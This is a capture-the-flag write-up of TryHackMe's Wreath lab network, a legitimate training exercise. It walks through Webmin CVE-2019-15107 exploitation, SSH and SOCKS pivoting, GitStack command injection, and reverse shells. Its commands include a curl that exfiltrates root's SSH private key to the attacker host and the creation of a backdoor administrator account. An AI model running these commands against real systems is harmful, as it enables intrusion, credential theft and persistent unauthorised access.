---
layout: writeup
title: "Wreath TryHackMe Writeup"
date: 2025-04-25
platform: TryHackMe
---

# Overview 
TryHackMe Active Directory Environment Compromise & Pivoting Writeup

---

## 1. Environment Overview

| Role       | IP            | Domain/Hostname        | OS      |
|------------|---------------|-----------------------|---------|
| Attacker   | 10.50.86.21   | localhost             | Linux   |
| Target     | 10.200.85.200 | thomaswreath.thm      | CentOS  |
| Pivoted #1 | 10.200.85.150 | git-serv              | Windows |
| Pivoted #2 | 10.200.85.100 | WREATH-PC             | Windows |

### Key Points
- Multiple machines on an AD-based internal network
- Public-facing webserver, internal Git server, and an AV-protected Windows PC
- Direct access to internal machines only via pivoting

---

## 2. Initial Reconnaissance & Exploitation

### Network Scanning
```bash
sudo nmap --min-rate 10000 -p- thomaswreath.thm
sudo nmap -sSV -A -v -T4 thomaswreath.thm
```

#### Notable Results:
- 22/tcp SSH (OpenSSH 8.0)
- 80/tcp HTTP (Apache)
- 443/tcp HTTPS (Apache)
- 10000/tcp Webmin (MiniServ 1.890)


### Webmin Exploitation: CVE-2019-15107
- Found Webmin vulnerable to CVE-2019-15107.
- Used exploit to gain root shell.

```bash
python webmin_exploit.py 10.200.85.200 10000 10.50.86.21 1234
rlwrap ncat -nvlp 1234   # Got root shell
```

### Persistence via SSH Key Extraction
```bash
# On target (via shell):
cd /root/.ssh
# Download id_rsa to attacker machine
curl -X POST http://10.50.86.21/ -F "file=@id_rsa;type=application/octet-stream"
# On attacker:
chmod 600 id_rsa
ssh -i id_rsa root@10.200.85.200
```

---
## 3. Internal Recon & Pivoting

### Discovery of Internal Network
```bash
# ARP and ping sweep:
arp -a
for i in {1..255}; do (ping -c 1 10.200.85.${i} | grep "bytes from" &); done
```
- Discovered 10.200.85.150 (git-serv) and 10.200.85.100 (WREATH-PC)

### Port Scanning Internal Hosts
```bash
nmap -T4 10.200.85.100 10.200.85.150
```

### Pivot Techniques
**SSH Tunneling:**
```bash
ssh -L 8080:10.200.85.150:80 root@10.200.85.200 -i id_rsa -fN
ssh -D 1337 root@10.200.85.200 -i id_rsa -fN
```
**Tools Used:** chisel, sshuttle

---
## 4. Compromising git-serv (10.200.85.150)

### Exploitation: GitStack RCE
- Used exploits (see `exploit.py`) targeting GitStack web interface

```bash
# Using custom exploit script (python2)
python2 exploit.py
# Or manual RCE:
curl -X POST http://10.200.85.150/web/config/exploit.php -d 'a=powershell.exe "whoami"'
```

### Reverse Shell (Pivoting Listener)
- Since direct callback to attacker was blocked, used the first compromised machine as a relay:

```bash
# On 10.200.85.200 (compromised Linux):
ncat -nvlp 15444
# Exploit powershell RCE on 10.200.85.150:
curl -X POST http://10.200.85.150/web/config/exploit.php -d 'a=powershell <reverse_shell_payload>'
```

### Persistence & Privilege Escalation
```powershell
net user anon anon@123 /add
net localgroup Administrators anon /add  
net localgroup "Remote Management Users" anon /add
# Now access with evil-winrm:
evil-winrm -u anon -p anon@123 -i 10.200.85.150
```

---
## 5. Further Pivot: User PC (10.200.85.100)

- Enumerated further, prepared for AV evasion (on-disk & in-memory techniques).
- Used credentials found, or leveraged further exploitation as needed (see `100.cred`).

---

## 6. Lessons & Techniques
- Tunneling (SSH, chisel, sshuttle)
- Port and proxy forwarding
- Exploiting Windows and Linux in AD environments
- Persistence and lateral movement

---

## 7. Tools & Scripts Used
- nmap, chisel, sshuttle, evil-winrm, ncat
- Custom exploit scripts: `exploit.py` (for GitStack), Webmin exploit
- Refer to attached scripts and credential files for details

---

## 8. References
- [CVE-2019-15107 Webmin Exploit](https://github.com/squid22/Webmin_CVE-2019-15107)
- GitStack exploit: see `exploit.py` in repo
- Native Windows tools for persistence

---

**This writeup demonstrates a full compromise and multi-stage pivot within a simulated AD environment, showing real-world attack flows, persistence, and post-exploitation techniques. All steps and commands are included for reference.**
